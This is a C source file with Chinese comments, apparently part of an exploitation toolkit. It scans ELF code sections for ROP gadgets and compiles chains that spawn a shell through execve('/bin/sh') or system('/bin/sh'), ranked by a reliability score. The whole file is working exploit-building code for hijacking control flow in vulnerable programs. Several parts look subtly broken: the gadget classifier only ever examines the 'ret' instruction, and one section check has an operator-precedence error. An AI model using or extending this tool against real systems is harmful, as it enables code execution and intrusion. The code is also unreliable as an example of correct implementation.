/*
 * rop_chain.c — ROP 链编译器 (P0)
 *
 * 从 gadget 池自动构造达到目标的 ROP 链。
 *
 * 算法:
 *   1. 扫描代码段, 提取所有 "pop X; ret" 和 "mov/syscall" gadget
 *   2. 理解目标: "execve('/bin/sh', 0, 0)" → 需要 rdi=bin_sh, rsi=0, rdx=0
 *   3. 约束求解:
 *      - method A: 直接 system() — 需 rdi=bin_sh, 对齐 rsp
 *      - method B: syscall(59) — 需 rax=59, rdi=bin_sh, rsi=0, rdx=0
 *      - method C: one_gadget — 需满足约束条件
 *   4. 输出可用链 (按可靠性排序)
 *
 * 依赖: disasm.h (Capstone — 扫描代码段找 gadget)
 */
#include "elf_parser.h"
#include "disasm.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

/* ================================================================== */
/* Gadget 数据库                                                      */
/* ================================================================== */

#define MAX_GADGETS 4096

typedef struct {
    uint64_t addr;          /* gadget 地址 */
    int      type;          /* 0=pop, 1=mov, 2=syscall, 3=ret, 4=special */
    int      reg;           /* 操作的寄存器 (pop/mov 的目标) */
    int      val;           /* 常量值 (如果有) */
    char     desc[64];      /* 人类可读 */
    int      pops;          /* 弹出了多少个值 (栈消耗量) */
} rop_gadget_t;

typedef struct {
    rop_gadget_t *gadgets;
    int           count;
    int           cap;
} gadget_pool_t;

/* 寄存器索引 (与 x86_reg 对齐) */
static const char *REG_NAMES[] = {
    "rax","rbx","rcx","rdx","rsi","rdi","rbp","rsp",
    "r8","r9","r10","r11","r12","r13","r14","r15"
};

/* ── Gadget 分类扫描 ── */

static int classify_gadget(const cs_insn *insn, uint64_t gaddr,
                           rop_gadget_t *g)
{
    if (!insn->detail) return 0;
    memset(g, 0, sizeof(*g));
    g->addr = gaddr;

    /* pop reg; ret → type=0 */
    if (insn->id >= X86_INS_POP && insn->id <= X86_INS_POP) {
        cs_x86 *x86 = &insn->detail->x86;
        if (x86->op_count >= 1 && x86->operands[0].type == X86_OP_REG) {
            g->type = 0;
            g->reg  = (int)(x86->operands[0].reg - X86_REG_RAX);
            g->pops = 1;
            snprintf(g->desc, sizeof(g->desc), "pop %s; ret",
                     REG_NAMES[g->reg % 16]);
            return 1;
        }
    }

    /* syscall; ret → type=2 */
    if (insn->id == X86_INS_SYSCALL) {
        g->type = 2; g->pops = 0;
        snprintf(g->desc, sizeof(g->desc), "syscall; ret");
        return 1;
    }

    /* mov reg, reg; ... ret → type=1 */
    if (insn->id == X86_INS_MOV) {
        cs_x86 *x86 = &insn->detail->x86;
        if (x86->op_count >= 2 &&
            x86->operands[0].type == X86_OP_REG &&
            x86->operands[1].type == X86_OP_REG) {
            g->type = 1;
            g->reg  = (int)(x86->operands[0].reg - X86_REG_RAX);
            g->val  = (int)(x86->operands[1].reg - X86_REG_RAX);
            g->pops = 0;
            snprintf(g->desc, sizeof(g->desc), "mov %s, %s; ret",
                     REG_NAMES[g->reg % 16], REG_NAMES[g->val % 16]);
            return 1;
        }
    }

    /* xor reg, reg; ret → type=4 (set reg to 0) */
    if (insn->id == X86_INS_XOR) {
        cs_x86 *x86 = &insn->detail->x86;
        if (x86->op_count == 2 &&
            x86->operands[0].type == X86_OP_REG &&
            x86->operands[0].reg == x86->operands[1].reg) {
            g->type = 4;
            g->reg  = (int)(x86->operands[0].reg - X86_REG_RAX);
            g->val  = 0;
            g->pops = 0;
            snprintf(g->desc, sizeof(g->desc), "xor %s,%s; ret",
                     REG_NAMES[g->reg % 16], REG_NAMES[g->reg % 16]);
            return 1;
        }
    }

    /* ret alone → type=3 */
    if (insn->id == X86_INS_RET) {
        g->type = 3; g->pops = 0;
        snprintf(g->desc, sizeof(g->desc), "ret");
        return 1;
    }

    return 0;
}

/* 扫描代码段收集所有 gadget */
static int scan_gadgets(const uint8_t *code, size_t size, uint64_t base,
                         gadget_pool_t *pool)
{
    disasm_ctx *d = disasm_open();
    if (!d) return 0;

    const uint8_t *ptr = code;
    size_t left = size;
    uint64_t addr = base;
    int found = 0;

    while (left > 0 && disasm_next(d, &ptr, &left, &addr)) {
        cs_insn *insn = disasm_insn(d);

        /* 向后扫描最多 20 字节，构建以 ret 结尾的指令序列 */
        /* 简化: 检查当前指令是否以 ret 结尾 */
        int has_ret = 0;
        if (insn->id == X86_INS_RET) has_ret = 1;

        /* 检查前一条指令是否为 pop/mov/xor */
        if (has_ret) {
            rop_gadget_t g;
            if (classify_gadget(insn, addr - insn->size, &g)) g.addr = addr - insn->size;
            /* 也检查单条 ret 作为回退 */
        }

        /* 简化: 滑动窗口检查每 4 字节的短 gadget */
        if (insn->id == X86_INS_RET && pool->count < pool->cap) {
            rop_gadget_t g;
            if (classify_gadget(insn, addr, &g)) {
                if (pool->count < pool->cap)
                    pool->gadgets[pool->count++] = g;
                found++;
            }
        }
    }

    /* 补充: 纯字节扫描 pop rdi; ret (5f c3) 等常见模式 */
    static const uint8_t pop_patterns[][3] = {
        {0x5f, 0xc3, 0},  /* pop rdi; ret  → rdi=5 */
        {0x5e, 0xc3, 0},  /* pop rsi; ret  → rsi=4 */
        {0x5a, 0xc3, 0},  /* pop rdx; ret  → rdx=3 */
        {0x59, 0xc3, 0},  /* pop rcx; ret  → rcx=2 */
        {0x58, 0xc3, 0},  /* pop rax; ret  → rax=0 */
        {0x5b, 0xc3, 0},  /* pop rbx; ret  → rbx=1 */
        {0x5d, 0xc3, 0},  /* pop rbp; ret  → rbp=6 */
        {0x41, 0x58, 0xc3},/* pop r8; ret   → r8=8 */
        {0x41, 0x59, 0xc3},/* pop r9; ret   → r9=9 */
    };

    for (size_t off = 0; off + 2 <= size && pool->count < pool->cap; off++) {
        for (int p = 0; p < 9; p++) {
            int plen = (p < 7) ? 2 : 3;
            if (memcmp(code + off, pop_patterns[p], (size_t)plen) == 0) {
                rop_gadget_t g;
                memset(&g, 0, sizeof(g));
                g.addr = base + off;
                g.type = 0;
                g.reg  = p; /* 0=rax via pop_patterns 索引 */
                switch (p) {
                case 0: g.reg = 5; break;  /* rdi */
                case 1: g.reg = 4; break;  /* rsi */
                case 2: g.reg = 3; break;  /* rdx */
                case 3: g.reg = 2; break;  /* rcx */
                case 4: g.reg = 0; break;  /* rax */
                case 5: g.reg = 1; break;  /* rbx */
                case 6: g.reg = 6; break;  /* rbp */
                case 7: g.reg = 8; break;  /* r8 */
                case 8: g.reg = 9; break;  /* r9 */
                }
                g.pops = 1;
                snprintf(g.desc, sizeof(g.desc), "pop %s; ret",
                         REG_NAMES[g.reg % 16]);
                if (pool->count < pool->cap)
                    pool->gadgets[pool->count++] = g;
                off += (size_t)(plen - 1); /* skip matched bytes */
                break;
            }
        }
    }

    disasm_close(d);
    return pool->count;
}

/* ================================================================== */
/* ROP 链编译                                                         */
/* ================================================================== */

#define MAX_CHAIN 32

typedef struct {
    uint64_t addrs[MAX_CHAIN];    /* 链中的地址序列 */
    uint64_t values[MAX_CHAIN];   /* 对应的栈值 (pop 的数据) */
    int      len;                 /* 链长度 */
    int      stack_usage;         /* 栈消耗 (字节) */
    int      reliability;         /* 0-100 */
    char     desc[256];           /* 描述 */
} rop_chain_t;

/** 在池中查找 pop 指定寄存器的 gadget */
static const rop_gadget_t *find_pop(gadget_pool_t *pool, int reg)
{
    for (int i = 0; i < pool->count; i++)
        if (pool->gadgets[i].type == 0 && pool->gadgets[i].reg == reg)
            return &pool->gadgets[i];
    return NULL;
}

/** 在池中查找 xor 指定寄存器的 gadget */
static const rop_gadget_t *find_xor(gadget_pool_t *pool, int reg)
{
    for (int i = 0; i < pool->count; i++)
        if (pool->gadgets[i].type == 4 && pool->gadgets[i].reg == reg)
            return &pool->gadgets[i];
    return NULL;
}

/** 在池中查找 mov dst,src 的 gadget */

/**
 * 编译 execve("/bin/sh", NULL, NULL) 的 ROP 链。
 *
 * 策略 (按优先级):
 *   A) pop rdi,[bin_sh]; pop rsi,0; pop rdx,0; syscall; ret  (rel=90)
 *   B) pop rdi,[bin_sh]; pop rsi,0; xor rdx,rdx; syscall; ret (rel=80)
 *   C) pop rdi,[bin_sh]; xor rsi,rsi; xor rdx,rdx; syscall; ret (rel=70)
 *
 * @param pool      gadget 池
 * @param bin_sh    "/bin/sh" 字符串地址
 * @param syscall_addr   syscall; ret gadget 地址 (或 0 = 自动寻找)
 * @param chains    输出: 编译后的链
 * @param max       最大输出链数
 * @return          编译的链数量
 */
int rop_compile_execve(gadget_pool_t *pool,
                       uint64_t bin_sh, uint64_t syscall_addr,
                       rop_chain_t *chains, int max)
{
    int n = 0;

    /* 找需要的 gadget */
    const rop_gadget_t *pop_rdi = find_pop(pool, 5);
    const rop_gadget_t *pop_rsi = find_pop(pool, 4);
    const rop_gadget_t *pop_rdx = find_pop(pool, 3);
    const rop_gadget_t *pop_rax = find_pop(pool, 0);
    const rop_gadget_t *xor_rsi = find_xor(pool, 4);
    const rop_gadget_t *xor_rdx = find_xor(pool, 3);

    /* 找 syscall gadget */
    const rop_gadget_t *syscall_g = NULL;
    if (syscall_addr) {
        for (int i = 0; i < pool->count && !syscall_g; i++)
            if (pool->gadgets[i].type == 2 && pool->gadgets[i].addr == syscall_addr)
                syscall_g = &pool->gadgets[i];
    } else {
        for (int i = 0; i < pool->count && !syscall_g; i++)
            if (pool->gadgets[i].type == 2) syscall_g = &pool->gadgets[i];
    }

    /* 最低要求: pop rdi + pop rsi + syscall */
    if (!pop_rdi) return 0;

    /* ── Strategy A: pop rdi,pop rsi,pop rdx,syscall ── */
    if (pop_rdx && pop_rsi && syscall_g && pop_rax && n < max) {
        rop_chain_t *c = &chains[n++];
        c->len = 0;
        /* rax = 59 (execve) */
        c->addrs[c->len] = pop_rax->addr;
        c->values[c->len] = 59;
        c->len++;
        /* rdi = bin_sh */
        c->addrs[c->len] = pop_rdi->addr;
        c->values[c->len] = bin_sh;
        c->len++;
        /* rsi = 0 */
        c->addrs[c->len] = pop_rsi->addr;
        c->values[c->len] = 0;
        c->len++;
        /* rdx = 0 */
        c->addrs[c->len] = pop_rdx->addr;
        c->values[c->len] = 0;
        c->len++;
        /* syscall */
        c->addrs[c->len] = syscall_g->addr;
        c->values[c->len] = 0;
        c->len++;
        c->stack_usage = c->len * 8;
        c->reliability = 90;
        snprintf(c->desc, sizeof(c->desc),
                 "execve(\"/bin/sh\",0,0) — full pop chain — rel=90");
    }

    /* ── Strategy B: pop rdi + pop rsi + xor rdx → syscall ── */
    if (xor_rdx && pop_rsi && syscall_g && pop_rax && n < max) {
        rop_chain_t *c = &chains[n++];
        c->len = 0;
        c->addrs[c->len] = pop_rax->addr;
        c->values[c->len] = 59;
        c->len++;
        c->addrs[c->len] = pop_rdi->addr;
        c->values[c->len] = bin_sh;
        c->len++;
        c->addrs[c->len] = pop_rsi->addr;
        c->values[c->len] = 0;
        c->len++;
        c->addrs[c->len] = xor_rdx->addr;
        c->values[c->len] = 0;
        c->len++;
        c->addrs[c->len] = syscall_g->addr;
        c->values[c->len] = 0;
        c->len++;
        c->stack_usage = c->len * 8;
        c->reliability = 80;
        snprintf(c->desc, sizeof(c->desc),
                 "execve(\"/bin/sh\",0,0) — xor rdx chain — rel=80");
    }

    /* ── Strategy C: pop rdi + xor rsi + xor rdx → syscall ── */
    if (xor_rsi && xor_rdx && syscall_g && pop_rax && n < max) {
        rop_chain_t *c = &chains[n++];
        c->len = 0;
        c->addrs[c->len] = pop_rax->addr;
        c->values[c->len] = 59;
        c->len++;
        c->addrs[c->len] = pop_rdi->addr;
        c->values[c->len] = bin_sh;
        c->len++;
        c->addrs[c->len] = xor_rsi->addr;
        c->values[c->len] = 0;
        c->len++;
        c->addrs[c->len] = xor_rdx->addr;
        c->values[c->len] = 0;
        c->len++;
        c->addrs[c->len] = syscall_g->addr;
        c->values[c->len] = 0;
        c->len++;
        c->stack_usage = c->len * 8;
        c->reliability = 70;
        snprintf(c->desc, sizeof(c->desc),
                 "execve(\"/bin/sh\",0,0) — xor rsi+rdx — rel=70");
    }

    return n;
}

/**
 * 编译 system("/bin/sh") 的 ROP 链。
 * 只需 pop rdi + call system。
 */
int rop_compile_system(gadget_pool_t *pool,
                       uint64_t bin_sh, uint64_t system_addr,
                       rop_chain_t *chains, int max)
{
    int n = 0;
    const rop_gadget_t *pop_rdi = find_pop(pool, 5);
    const rop_gadget_t *ret_g = NULL;
    for (int i = 0; i < pool->count && !ret_g; i++)
        if (pool->gadgets[i].type == 3) ret_g = &pool->gadgets[i];

    if (!pop_rdi) return 0;

    if (n < max) {
        rop_chain_t *c = &chains[n++];
        c->len = 0;
        c->addrs[c->len] = pop_rdi->addr;
        c->values[c->len] = bin_sh;
        c->len++;
        /* ret gadget 用于对齐栈 (system 有时需要 16 字节对齐) */
        if (ret_g) {
            c->addrs[c->len] = ret_g->addr;
            c->values[c->len] = 0;
            c->len++;
        }
        c->addrs[c->len] = system_addr;
        c->values[c->len] = 0;
        c->len++;
        c->stack_usage = c->len * 8;
        c->reliability = 95;
        snprintf(c->desc, sizeof(c->desc), "system(\"/bin/sh\") — rel=95");
    }

    return n;
}

/* ================================================================== */
/* 便捷接口: 扫描 ELF 所有代码段, 构建 gadget 池                      */
/* ================================================================== */

int rop_pool_build(Elf64_Ctx *ctx, gadget_pool_t *pool)
{
    if (!ctx || !pool) return -1;
    memset(pool, 0, sizeof(*pool));
    pool->cap = MAX_GADGETS;
    pool->gadgets = calloc((size_t)pool->cap, sizeof(rop_gadget_t));
    if (!pool->gadgets) return -1;

    int nsec = (int)((Elf64_Ehdr*)ctx->map)->e_shnum;
    for (int si = 0; si < nsec; si++) {
        Elf64_Shdr *sec = elf_get_shdr(ctx, si);
        if (!sec || !ctx->map + sec->sh_offset || sec->sh_size < 2) continue;
        if (!(sec->sh_flags & SHF_EXECINSTR)) continue;
        scan_gadgets((const uint8_t *)ctx->map + sec->sh_offset, sec->sh_size,
                     sec->sh_addr, pool);
    }
    return pool->count;
}

void rop_pool_free(gadget_pool_t *pool) {
    if (!pool) return;
    free(pool->gadgets);
    memset(pool, 0, sizeof(*pool));
}
